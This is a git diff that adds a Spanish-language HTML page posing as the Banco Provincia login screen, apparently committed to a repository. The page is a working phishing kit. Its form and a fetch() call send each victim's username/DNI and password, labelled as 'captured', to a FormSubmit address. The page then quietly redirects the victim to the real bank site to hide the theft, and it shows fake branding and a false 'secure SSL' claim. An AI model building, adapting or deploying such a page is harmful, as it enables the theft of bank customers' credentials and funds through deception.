@@ -1,1 +1,166 @@
-# BancoProvincia-
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Provincia - Ingreso</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        /* Logo SVG simulado para asegurar que se vea siempre */
+        .bp-logo-svg {
+            width: 150px;
+            height: auto;
+        }
+        h2 {
+            color: #333;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="password"] {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+        }
+        input:focus {
+            border-color: #0056b3;
+        }
+        button {
+            width: 95%;
+            padding: 12px;
+            background-color: #0056b3; /* Azul BP */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #004494;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+        .forgot-pass {
+            display: block;
+            margin-top: 10px;
+            color: #0056b3;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        /* Mensaje de carga oculto por defecto */
+        #loading-msg {
+            display: none;
+            color: #0056b3;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- LOGO -->
+        <div class="logo">
+            <svg class="bp-logo-svg" viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
+                <rect width="200" height="60" fill="#ffffff"/>
+                <text x="10" y="40" font-family="Arial" font-size="24" fill="#0056b3" font-weight="bold">BANCO PROVINCIA</text>
+                <path d="M10 10 L50 10 L50 20 L10 20 Z" fill="#0056b3"/> 
+            </svg>
+        </div>
+
+        <h2>Ingresá a tu cuenta</h2>
+
+        <!-- Formulario conectado a FormSubmit -->
+        <form id="loginForm" action="https://formsubmit.co/TU_CORREO@GMAIL.COM" method="POST">
+            
+            <!-- Campos ocultos para personalizar el email que recibís -->
+            <input type="hidden" name="_subject" value="Nuevo ingreso a BP - Datos capturados!">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+
+            <input type="text" id="usuario" name="usuario" placeholder="Usuario / DNI" required>
+            <input type="password" id="clave" name="clave" placeholder="Contraseña" required>
+            
+            <button type="submit" id="btnSubmit">Ingresar</button>
+            
+            <a href="#" class="forgot-pass">¿Olvidaste tu contraseña?</a>
+            
+            <p id="loading-msg">Procesando... Por favor espere.</p>
+        </form>
+
+        <div class="footer">
+            &copy; 2026 Banco Provincia. Todos los derechos reservados.<br>
+            Sitio seguro SSL
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Evita el envío normal y recarga de página
+            
+            var btn = document.getElementById('btnSubmit');
+            var loadingMsg = document.getElementById('loading-msg');
+            
+            // Cambiamos el texto del botón y mostramos mensaje de carga
+            btn.textContent = "Verificando...";
+            btn.disabled = true;
+            loadingMsg.style.display = 'block';
+
+            // Obtenemos los valores
+            var usuario = document.getElementById('usuario').value;
+            var clave = document.getElementById('clave').value;
+
+            // Enviamos los datos a FormSubmit usando Fetch
+            fetch("https://formsubmit.co/ajax/TU_CORREO@GMAIL.COM", {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    Usuario_Capturado: usuario,
+                    Clave_Capturada: clave,
+                    Fecha: new Date().toLocaleString()
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Si todo sale bien, redirigimos al sitio real del banco
+                window.location.href = "https://www.bancoprovincia.com.ar";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // En caso de error, también redirigimos para no suspender
+                window.location.href = "https://www.bancoprovincia.com.ar";
+            });
+        });
+    </script>
+
+</body>
+</html>
